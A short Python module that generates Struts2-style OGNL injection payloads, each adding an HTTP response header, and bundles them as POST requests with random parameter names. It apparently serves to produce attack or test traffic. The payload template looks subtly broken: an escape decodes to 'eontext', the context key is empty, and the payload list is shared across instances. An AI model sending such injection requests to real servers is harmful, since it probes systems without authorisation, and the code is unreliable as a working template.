import random
from module import common
from urllib.parse import unquote, quote


class javainject:
    common = None
    payloads = []

    def __init__(self, common=None):
        if (common != None):
            self.common = common


    def generate_payload(self, amount):
        payload_templates = r"%{\u0023\u0065ontext[''].addHeader('STR','STR')}"
        for _ in range(amount):
            payload = self.common.replace(payload_templates,"STR",8)
            parame = "{}={}".format(self.common.get_random_parame()[0], payload)
            self.payloads.append(parame)

    def generate_packages(self, amount):
        self.generate_payload(amount)
        packages = [self.common.generate(self.payloads[i],
                                         method="POST",
                                         payload_location="body_parame") for i in range(amount)]
        return packages
